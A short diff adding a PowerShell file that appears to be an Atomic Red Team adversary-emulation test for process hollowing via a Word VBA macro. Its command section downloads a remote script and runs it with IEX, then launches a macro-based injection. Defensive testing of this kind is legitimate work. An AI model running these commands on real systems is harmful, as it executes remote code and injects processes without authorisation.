@@ -1,0 +1,21 @@
+#TechniqueName: Process Injection: Process Hollowing
+#AtomicTestName: RunPE via VBA
+#Language: ps1
+
+#get_prereq_commands
+Write-Host "You will need to install Microsoft Word manually to meet this requirement"
+
+
+#prereq_commands
+try {
+  New-Object -COMObject "Word.Application" | Out-Null
+  $process = "Word"; if ( $process -eq "Word") {$process = "winword"}
+  Stop-Process -Name $process
+  exit 0
+} catch { exit 1 }
+
+
+#commands
+IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1") 
+Invoke-MalDoc -macroFile "PathToAtomicsFolder\T1055.012\src\T1055.012-macrocode.txt" -officeProduct "Word" -sub "Exploit"
+
